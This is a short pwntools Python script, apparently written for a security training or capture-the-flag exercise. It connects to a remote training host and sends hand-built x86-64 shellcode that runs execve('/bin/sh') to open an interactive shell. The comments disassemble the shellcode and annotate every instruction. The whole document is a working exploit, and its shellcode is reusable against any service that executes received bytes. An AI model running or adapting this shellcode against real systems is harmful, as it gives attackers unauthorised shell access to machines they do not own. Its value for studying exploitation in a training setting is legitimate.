
from pwn import *
site = "training.jinblack.it"
port = 3001
r = remote (site, port )#write a version that connects on a specified port on argument
#r = remote( "127.0.0.1",4002)#local session
#0:  48 05 00 01 00 00       add    rax,0x100 <-- this is because I probs jump to rax
#6:  48 89 c4                mov    rsp,rax
#9:  48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f6e69622f <-- this is the b"/bin/sh\x00"
#    73 68 00
#13: 53                      push   rbx <-- I'm getting it to the stack
#14: 48 89 e7                mov    rdi,rsp <-- Here goes my pointer to /bin/sh !
#17: 48 31 db                xor    rbx,rbx <-- this is the null
#1a: 53                      push   rbx     <-- this is getting the null to the stack
#1b: 48 89 e6                mov    rsi,rsp <-- now this is my first null pointer
#1e: 48 89 e2                mov    rdx,rsp <-- this then is the second
#21: 48 c7 c0 3b 00 00 00    mov    rax,0x3b<-- color me surprised, it's the execve!
#28: 0f 05                   syscall
shellcode =b"\x48\x05\x00\x01\x00\x00\x48\x89\xC4\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xDB\x53\x48\x89\xE6\x48\x89\xE2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05"
#use python to accelerate your exploitation phase if necessary
#scripts lets you get more tries !!!
input("press any key")#waits

r.send(shellcode)
r.interactive()
#from this point on the connection opens a shell for stdin/stdout
